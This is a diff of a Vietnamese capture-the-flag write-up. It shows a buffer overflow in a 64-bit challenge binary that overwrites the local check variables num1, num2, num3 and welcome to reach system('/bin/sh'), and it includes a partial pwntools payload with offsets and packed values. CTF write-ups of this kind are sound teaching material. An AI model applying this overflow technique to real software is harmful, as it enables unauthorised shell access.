@@ -7,16 +7,16 @@ Giờ ta sẽ nhìn sơ qua file binary được cung cấp và các chế độ
 
 Vậy chúng ta sẽ làm việc với file binary 64 bit. Khi chạy thì chương trình sẽ yêu cầu ta nhập key khi sai thì dừng chương trình.
 
-![image](https://user-images.githubusercontent.com/114044703/213361251-717903c3-b9d2-4e48-b82a-bbac4ca0828c.png)
+![image](https://user-images.githubusercontent.com/114044703/213618940-7c2d504d-855d-4482-8d42-61c0d1cc96d1.png)
 
-![image](https://user-images.githubusercontent.com/114044703/213361301-9ec9c468-001c-46eb-bf46-47dbfc5da649.png)
+![image](https://user-images.githubusercontent.com/114044703/213618919-9caebee7-cceb-4504-bf50-1ab9d29ff439.png)
 
-Sau khi đọc hàm main từ trình ghidra ta thấy chương trình sẽ cho ta nhập 0x50 byte vào biến input sau đó kiểm tra xem num1, num2, num3 có đúng điều kiện không, nếu có thì thực thi system("/bin/sh") không thì kết thúc chương trình
+Sau khi đọc hàm main từ trình ghidra ta thấy chương trình sẽ cho ta nhập 0x50 byte vào biến input sau đó kiểm tra xem num1, num2, num3, welcome có đúng điều kiện không, nếu có thì thực thi system("/bin/sh") không thì kết thúc chương trình
 
-#BUG: Ta nhận thấy input được ghi vào 0x50 dù không đủ để đè save rip nhưng đủ để có thể đè lên biến num1, num2, num3.
+#BUG: Ta nhận thấy input được ghi vào 0x50 dù không đủ để đè save rip nhưng đủ để có thể đè lên biến num1, num2, num3, welcome.
 
 Ý tưởng: 
-  - Vậy ta có thể sử dụng lỗi buffer over flow để ghi lại num1, num2, num3 để ghi lại để thực thi system("/bin/sh") 
+  - Vậy ta có thể sử dụng lỗi buffer over flow ghi lại num1, num2, num3 và welcome để có thể thực thi system("/bin/sh") 
 
 Ta sẽ khai thác vơi những dữ liệu trên:
 ```
@@ -34,7 +34,7 @@ offset2=0x58-0x18
 offset3=0x58-0xc
 offset=0x58-0x38
 
-payload=b"A"*(offset)+p64(0x20656d6f636c6557)+p64(0x4353434b206f74)
+payload=b"A"*(offset)+p64(0x20656d6f636c6557)+p64(0x4353434b206f74)  #Welcome to KCSC
 payload=payload.ljust(offset1,b"A")
 payload+=p64(0x215241104735f10f)
 payload=payload.ljust(offset2,b"A")
